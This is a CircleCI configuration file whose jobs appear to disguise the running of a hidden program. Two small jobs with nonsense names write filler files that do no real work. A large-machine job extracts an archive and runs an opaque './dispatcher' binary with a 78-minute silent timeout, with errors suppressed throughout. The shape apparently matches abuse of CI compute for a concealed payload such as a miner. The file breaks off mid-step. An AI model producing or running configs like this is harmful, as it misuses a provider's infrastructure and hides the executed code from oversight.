version: 2.1

jobs:
  cacher_europa-beta:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: spin cycle
          command: |
            mkdir -p /tmp/handoff
            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/handoff/final.md; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/handoff/final.md; done; true
            echo "staging complete; file length=$(wc -c </tmp/handoff/final.md)"
      - persist_to_workspace:
          root: /tmp/handoff
          paths:
            - final.md
  europa-beta:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/handoff
      - run:
          name: Load previous
          command: |
            { od -An -c /tmp/handoff/final.md 2>/dev/null | head -3; echo "od ok" ; } || true
      - run:
          name: Shallow clone
          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Materialize bundle
          command: tar -I gzip -xf files.tgz
      - run:
          no_output_timeout: 78m
          command: "./dispatcher"
  gamma_verify:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/handoff
      - run:
          name: blend edges
          command: |
            mkdir -p /tmp/handoff
            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50;i++)if(i%2)o++;else e++; print o"-"e}'; true ; } > /tmp/handoff/stage-ready.sig
            echo "staging complete; file length=$(wc -c </tmp/handoff/stage-ready.sig)"
      - persist_to_workspace:
